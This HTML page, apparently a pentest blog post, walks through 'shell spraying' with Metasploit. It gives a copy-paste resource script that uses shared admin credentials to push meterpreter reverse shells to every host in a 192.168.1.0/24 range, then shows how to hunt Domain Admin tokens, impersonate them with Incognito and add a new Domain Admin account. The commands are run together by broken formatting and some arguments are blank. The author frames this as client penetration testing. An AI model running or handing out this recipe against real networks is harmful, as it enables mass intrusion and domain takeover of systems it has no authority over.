<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>PSExec Shell Spray For Auth Tokens</title>
</head><body>Psexec “Shell spraying” is the act of using the Psexec module in Metasploit to install shells (typically meterpreter) on hundreds of systems using shared local administrative credentials. Many pentesters use this method in concert with other Metasploit functionality to identify Domain Admin tokens. This is my least favorite technique, but since a large portion of the pentest community is actively using it I feel that I needed to include it. I like getting shells as much as the next guy, but kicking off 500 hundred of them in a production environment could cause availability issues that clients will be really unhappy with. To be fair, having 500 shells does mean you can scrape data faster, but I still think it creates more risk than value. Regardless, below is the process I have seen a lot of people using:<br/>
<ul><li>Install Metasploit 3.5 or greater.<i></i></li>
<li>Copy paste script below to a text file and save into the Metasploit directory as psexec_spray.rc. I originally found this script on <a href="http://spl0it.wordpress.com/">Jabra’s blog</a>.<i></i></li>
<li>#Setup Multi Handler to accept multiple incoming connections use multi/handler setg PAYLOAD windows/meterpreter/reverse_tcp setg LHOST 0.0.0.0 setg LPORT 55555 set ExitOnSession false exploit -j -z</li>
<li>#Setup Credentials use windows/smb/psexec set SMBUser set SMBPass</li>
</ul>
<ul>#Setup Domain as local host unless using domain credentials set SMBDomain. #Disable playload handler in psexec modules (using multi handler) set DisablePayloadHandler true #Run Ruby code to scan desired network range using some REX API stuff – range walker #note: could also accept ip addresses from a file by replacing rhosts =”192.168.74.0/24” with rhosts = File.readlines(“c:systems.txt”) require ‘rex/socket/range_walker’ rhosts = “192.168.1.0/24” iplist = Rex::Socket::RangeWalker.new(rhosts) iplist.each do |rhost|      #self allows for execution of commands in msfconsole      self.run_single(“set RHOST #{rhost}”)      #-j-z send the session to the background      self.run_single(“exploit -j -z”) end</ul>
<ul><li>Update the smbuser and smbpass parameters.</li>
<li>Issue the following command to run the script. The psexec_spray.rc script will attempt to blindly install meterpreter shells on every system in the 192.168.1.0/24 network using the provided credentials.</li>
</ul>
<ul>msfconsole –r psexec_spray.rc</ul>
<ul>You can then use the Metasploit module token_hunter to identify Domain Admin tokens on each of the shelled systems. I’ve outlined the steps below.</ul>
<ul><li style="list-style-type: none"><ul><li>Create a file containing a list of the Domain Admins like so: COMPANYjoe-admin COMPANYbill-admin COMPANYdavid-admin</li>
<li>Load the token_hunter module in the msfconsole msf&gt; load token_hunter</li>
<li>Run token hunter to list the sessions containing Domain Admin tokens. msf&gt; token_hunt_user -f /tmp/domain-admin.txt</li>
</ul>
</li>
<li>Alternatively, you can use the following command to get a list of currently logged in users from each of the shelled system and manually look for Domain Admins.</li>
<li>Sessions –s loggedin</li>
</ul>
<br/>
<b>What Now?</b><br/>
If you already have a meterpreter session you can use Incognito to impersonate the Domain Admin, or add a new one. Incognito can attempt to add a new Domain Admin blindly by iterating through all of the available authencation tokens on the system. Below are the basic commands to do that in meterpreter.<br/>
<ul><i><li>Load Incognito in your active meterpreter session with the following command:</li>
</i></ul>
<i><ul>load incongnito</ul>
</i><ul><i><li>Attempt to add a Domain Admin with the authentication tokens on the system:</li>
<li>add_user -h </li>
<li>add_group “”Domain Admins”” -h</li>
<li></li>
</i></ul>
If you’re interested in creating a new Domain Admin using another option you can use the instructions below:<br/>
<ul><i><li>In the meterpreter console, type the following command to view processes:</li>
</i></ul>
<i><ul>ps</ul>
<ul><li>In the meterpreter console, find a domain admin session and migrate to using the following command:</li>
</ul>
<ul>migrate</ul>
<ul><li>In the meterpreter console, type the following command get a OS shell:</li>
</ul>
<ul>shell</ul>
</i><ul><i><li>Type the following native Windows command to add a new Domain Admin:</li>
<li>net user /add /domain</li>
<li>net group “Domain Admins” /add /domain</li>
<li></li>
</i></ul>
&nbsp; <br/>
</body></html>